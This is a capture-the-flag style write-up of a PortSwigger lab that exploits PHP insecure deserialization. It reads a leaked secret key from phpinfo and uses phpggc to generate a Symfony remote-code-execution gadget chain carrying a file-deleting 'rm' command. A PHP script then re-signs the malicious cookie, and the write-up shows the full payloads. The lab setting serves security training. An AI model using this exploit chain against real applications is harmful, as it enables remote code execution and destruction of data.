# Exploiting PHP deserialization with a pre-built gadget chain

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain), you'll learn: Exploiting PHP deserialization with a pre-built gadget chain! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's [insecure deserialization](https://portswigger.net/web-security/deserialization) using pre-built gadget chains.

To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-6/images/Pasted%20image%2020230111194743.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-6/images/Pasted%20image%2020230111194756.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-6/images/Pasted%20image%2020230111194813.png)

When we're successfully logged in, it'll set a new session cookie.

**URL decoded:**
```json
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJseGF1N3pybHQ2cHU4bGFnYWhnNmRvcm1uajF6aGRncyI7fQ==","sig_hmac_sha1":"5ccbfbdfb92f58616d627e16c27d3bde8f720362"}
```

As you can see, the `token` key's value last 2 characters are `=`, which is a padding for base64 encoding.

**Let's decode that:**
```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 23-01-11 - 19:49:51
╰─○ echo 'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJseGF1N3pybHQ2cHU4bGFnYWhnNmRvcm1uajF6aGRncyI7fQ==' | base64 -d              
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"lxau7zrlt6pu8lagahg6dormnj1zhdgs";}
```

In here, we can see that is a **PHP serialized object.**

**View source page:**
```html
<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->
```

In the "My Account" page, there is a HTML comment, which is an `<a>` element that points to `/cgi-bin/phpinfo.php`.

**Let's go there:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-6/images/Pasted%20image%2020230111195303.png)

This page is a the web application PHP's configuration.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-6/images/Pasted%20image%2020230111201646.png)

- Found `SECRET_KEY` environment variable: `2u7ak75w9a051k3ehgji62gykvo0k3gl`

**Now, we can try to modify the PHP serialized object:**
```php
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";s:32:"lxau7zrlt6pu8lagahg6dormnj1zhdgs";}
```

**Then base64, URL encode it, and send the payload:**
```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 23-01-11 - 20:18:32
╰─○ echo -n 'O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";s:32:"lxau7zrlt6pu8lagahg6dormnj1zhdgs";}' | base64
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6Imx4YXU3enJsdDZwdThsYWdhaGc2ZG9ybW5qMXpoZGdzIjt9
```

```json
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6Imx4YXU3enJsdDZwdThsYWdhaGc2ZG9ybW5qMXpoZGdzIjt9","sig_hmac_sha1":"5ccbfbdfb92f58616d627e16c27d3bde8f720362"}
```

```json
%7B%22token%22%3A%22Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6Imx4YXU3enJsdDZwdThsYWdhaGc2ZG9ybW5qMXpoZGdzIjt9%22%2C%22sig_hmac_sha1%22%3A%225ccbfbdfb92f58616d627e16c27d3bde8f720362%22%7D
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-6/images/Pasted%20image%2020230111202007.png)

In here, we saw an error message, which tells us the `sig_hmac_sha1` doesn't match.

However, it also leaked the PHP framework: Symfony version 4.3.6

Armed with above information, we can start to build our gadet chains.

**Luckly, there is a tool called `phpggc` (PHP Generic Gadget Chains), which generates a PHP serialized object gadget chains.**

**We can use `phpggc -l Zend` to list all available gadget chains:**
```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 23-01-11 - 20:13:39
╰─○ phpggc -l Symfony                                                  

Gadget Chains
-------------

NAME            VERSION                        TYPE                   VECTOR         I    
Symfony/FW1     2.5.2                          File write             DebugImport    *    
Symfony/FW2     3.4                            File write             __destruct          
Symfony/RCE1    3.3                            RCE (Command)          __destruct     *    
Symfony/RCE2    2.3.42 < 2.6                   RCE (PHP code)         __destruct     *    
Symfony/RCE3    2.6 <= 2.8.32                  RCE (PHP code)         __destruct     *    
Symfony/RCE4    3.4.0-34, 4.2.0-11, 4.3.0-7    RCE (Function call)    __destruct     *
```

**Let's use the `Symfony/RCE1` payload!**
```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 23-01-11 - 20:20:59
╰─○ phpggc -i Symfony/RCE1
Name           : Symfony/RCE1
Version        : 3.3
Type           : RCE (Command)
Vector         : __destruct
Informations   : 
Executes given command through proc_open()

./phpggc Symfony/RCE1 <command>

╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 23-01-11 - 20:21:26
╰─○ phpggc -b Symfony/RCE1 'rm /home/carlos/morale.txt' 
Tzo0MzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxBcGN1QWRhcHRlciI6Mzp7czo2NDoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcQWJzdHJhY3RBZGFwdGVyAG1lcmdlQnlMaWZldGltZSI7czo5OiJwcm9jX29wZW4iO3M6NTg6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXEFic3RyYWN0QWRhcHRlcgBuYW1lc3BhY2UiO2E6MDp7fXM6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXEFic3RyYWN0QWRhcHRlcgBkZWZlcnJlZCI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO30=
```

**Combined payload:**
```json
{"token":"Tzo0MzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxBcGN1QWRhcHRlciI6Mzp7czo2NDoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcQWJzdHJhY3RBZGFwdGVyAG1lcmdlQnlMaWZldGltZSI7czo5OiJwcm9jX29wZW4iO3M6NTg6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXEFic3RyYWN0QWRhcHRlcgBuYW1lc3BhY2UiO2E6MDp7fXM6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXEFic3RyYWN0QWRhcHRlcgBkZWZlcnJlZCI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO30=","sig_hmac_sha1":"5ccbfbdfb92f58616d627e16c27d3bde8f720362"}
```

However, this payload won't work, because the HMAC SHA1 key doesn't match to the sever one.

**To solve that, we can sign our own HMAC key via a PHP's `hash_hmac` function, as we have the `SECRET_KEY` environment variable:**
```php
<?php
    $gadgetChains = 'Tzo0MzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxBcGN1QWRhcHRlciI6Mzp7czo2NDoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcQWJzdHJhY3RBZGFwdGVyAG1lcmdlQnlMaWZldGltZSI7czo5OiJwcm9jX29wZW4iO3M6NTg6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXEFic3RyYWN0QWRhcHRlcgBuYW1lc3BhY2UiO2E6MDp7fXM6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXEFic3RyYWN0QWRhcHRlcgBkZWZlcnJlZCI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO30=';
    $secretKey = '2u7ak75w9a051k3ehgji62gykvo0k3gl';

    $signedHMACSHA1Key = hash_hmac('sha1', $gadgetChains, $secretKey);
    $cookie = "{\"token\":\"$gadgetChains\",\"sig_hmac_sha1\":\"$signedHMACSHA1Key\"}";

    $finalPayload = urlencode($cookie);

    echo "[+] Final payload: \n" . $finalPayload;
?>
```

```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 23-01-11 - 20:29:30
╰─○ php sign_key.php
[+] Final payload: 
%7B%22token%22%3A%22Tzo0MzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxBcGN1QWRhcHRlciI6Mzp7czo2NDoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcQWJzdHJhY3RBZGFwdGVyAG1lcmdlQnlMaWZldGltZSI7czo5OiJwcm9jX29wZW4iO3M6NTg6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXEFic3RyYWN0QWRhcHRlcgBuYW1lc3BhY2UiO2E6MDp7fXM6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXEFic3RyYWN0QWRhcHRlcgBkZWZlcnJlZCI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO30%3D%22%2C%22sig_hmac_sha1%22%3A%223f9ccfcdbecca0452e54f14747cece4fc8fa0a7b%22%7D
```

**Then copy that URL encoded payload to our session cookie:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-6/images/Pasted%20image%2020230111203048.png)

After that, refresh the page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-6/images/Pasted%20image%2020230111203059.png)

Nice!

# What we've learned:

1. Exploiting PHP deserialization with a pre-built gadget chain